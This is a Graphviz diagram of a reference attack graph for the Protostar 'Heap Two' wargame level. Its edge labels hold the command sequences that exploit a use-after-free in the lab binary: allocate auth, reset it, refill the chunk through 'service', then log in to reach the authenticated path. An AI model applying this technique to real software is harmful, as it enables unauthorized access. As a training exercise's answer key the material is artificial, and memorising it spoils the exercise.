digraph AttackGraph {
  rankdir=LR;
  graph [fontsize=12, labelloc="t", label="Attack Graph (reference) - Protostar Heap Two"];
  node [shape=box, style="rounded,filled", fillcolor="#F7F7F7", color="#444444", fontname="Helvetica"];
  edge [color="#555555", fontname="Helvetica", fontsize=10];

  start [shape="box", style="rounded,filled", fillcolor="#EAF3FF", color="#444444", fontname="Helvetica", label="Start"];
  node0 [shape="box", style="rounded,filled", fillcolor="#F7F7F7", color="#444444", fontname="Helvetica", label="Auth allocation primitive used"];
  node1 [shape="box", style="rounded,filled", fillcolor="#F7F7F7", color="#444444", fontname="Helvetica", label="Freed auth chunk replaced by service allocation"];
  node2 [shape="box", style="rounded,filled", fillcolor="#F7F7F7", color="#444444", fontname="Helvetica", label="login checks attacker-controlled auth field"];
  node3 [shape="box", style="rounded,filled", fillcolor="#E8FFE8", color="#2E7D32", fontname="Helvetica", penwidth="2", label="Authenticated path reached"];

  start -> node0 [color="#555555", fontname="Helvetica", fontsize="10", label="echo 'auth A' | /opt/protostar/bin/heap2"];
  node0 -> node1 [color="#555555", fontname="Helvetica", fontsize="10", label="(echo 'auth A'; echo 'reset'; echo 'service AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA') | /opt/protostar/bin/heap2"];
  node1 -> node2 [color="#555555", fontname="Helvetica", fontsize="10", label="(echo 'auth A'; echo 'reset'; echo 'service AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA'; echo 'login') | /opt/protostar/bin/heap2"];
  node2 -> node3 [color="#555555", fontname="Helvetica", fontsize="10", label="(echo 'auth A'; echo 'reset'; echo 'service AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA'; echo 'login') | /opt/protostar/bin/heap2"];
}
